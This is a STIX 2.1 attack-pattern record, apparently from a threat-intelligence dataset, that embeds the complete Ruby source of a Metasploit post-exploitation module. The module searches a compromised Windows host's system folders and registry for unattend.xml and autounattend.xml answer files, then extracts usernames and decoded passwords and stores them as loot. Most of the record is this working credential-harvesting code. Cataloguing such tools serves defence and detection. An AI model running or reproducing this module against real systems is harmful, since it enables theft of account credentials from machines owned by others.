{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db7d95c5-28e4-4778-bc0c-af0a32c35b20",
    "created": "2024-08-14T16:33:05.028973Z",
    "modified": "2024-08-14T16:33:05.028977Z",
    "name": "Windows Gather Unattended Answer File Enumeration",
    "description": " This module will check the file system for a copy of unattend.xml and/or autounattend.xml found in Windows Vista, or newer Windows systems.  And then extract sensitive information such as usernames and decoded passwords.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_unattend.rb",
            "external_id": "enum_unattend.rb"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/library/ff715801"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Unattended Answer File Enumeration',\n        'Description' => %q{\n          This module will check the file system for a copy of unattend.xml and/or\n          autounattend.xml found in Windows Vista, or newer Windows systems.  And then\n          extract sensitive information such as usernames and decoded passwords.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Sean Verity <veritysr1980[at]gmail.com>',\n          'sinn3r',\n          'Ben Campbell'\n        ],\n        'References' => [\n          ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],\n          ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],\n          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])\n      ]\n    )\n  end\n\n  #\n  # Determine if unattend.xml exists or not\n  #\n  def unattend_exists?(xml_path)\n    exist?(xml_path)\n  end\n\n  #\n  # Read and parse the XML file\n  #\n  def load_unattend(xml_path)\n    print_status(\"Reading #{xml_path}\")\n    raw = read_file(xml_path)\n\n    begin\n      xml = REXML::Document.new(raw)\n    rescue REXML::ParseException => e\n      print_error('Invalid XML format')\n      vprint_line(e.message)\n      return nil, raw\n    end\n\n    return xml, raw\n  end\n\n  #\n  # Save Rex tables separately\n  #\n  def save_cred_tables(cred_table)\n    t = cred_table\n    vprint_line(\"\\n#{t}\\n\")\n    p = store_loot('windows.unattended.creds', 'text/plain', session, t.to_csv, t.header, t.header)\n    print_good(\"#{t.header} saved as: #{p}\")\n  end\n\n  #\n  # Save the raw version of unattend.xml\n  #\n  def save_raw(xmlpath, data)\n    return if data.empty?\n\n    fname = ::File.basename(xmlpath)\n    p = store_loot('windows.unattended.raw', 'text/plain', session, data)\n    print_good(\"Raw version of #{fname} saved as: #{p}\")\n  end\n\n  #\n  # If we spot a path for the answer file, we should check it out too\n  #\n  def get_registry_unattend_path\n    # HKLM\\System\\Setup!UnattendFile\n    fname = registry_getvaldata('HKEY_LOCAL_MACHINE\\\\System\\\\Setup', 'UnattendFile')&.strip\n    return fname\n  end\n\n  #\n  # Initialize all 7 possible paths for the answer file\n  #\n  def init_paths\n    drive = expand_path('%SystemDrive%')\n\n    files =\n      [\n        'unattend.xml',\n        'autounattend.xml'\n      ]\n\n    target_paths =\n      [\n        \"#{drive}\\\\\",\n        \"#{drive}\\\\Windows\\\\System32\\\\sysprep\\\\\",\n        \"#{drive}\\\\Windows\\\\panther\\\\\",\n        \"#{drive}\\\\Windows\\\\Panther\\Unattend\\\\\",\n        \"#{drive}\\\\Windows\\\\System32\\\\\"\n      ]\n\n    paths = []\n    target_paths.each do |p|\n      files.each do |f|\n        paths << \"#{p}#{f}\"\n      end\n    end\n\n    # If there is one for registry, we add it to the list too\n    reg_path = get_registry_unattend_path\n    paths << reg_path unless reg_path.blank?\n    return paths\n  end\n\n  def run\n    init_paths.each do |xml_path|\n      # If unattend.xml doesn't exist, move on to the next one\n      unless unattend_exists?(xml_path)\n        vprint_error(\"#{xml_path} not found\")\n        next\n      end\n\n      xml, raw = load_unattend(xml_path)\n      save_raw(xml_path, raw)\n\n      # XML failed to parse, will not go on from here\n      return unless xml\n\n      results = Rex::Parser::Unattend.parse(xml)\n      table = Rex::Parser::Unattend.create_table(results)\n      table.print unless table.nil?\n      print_line\n\n      # Save the data to a file, TODO: Save this as a Mdm::Cred maybe\n      save_cred_tables(table) unless table.nil?\n\n      return unless datastore['GETALL']\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}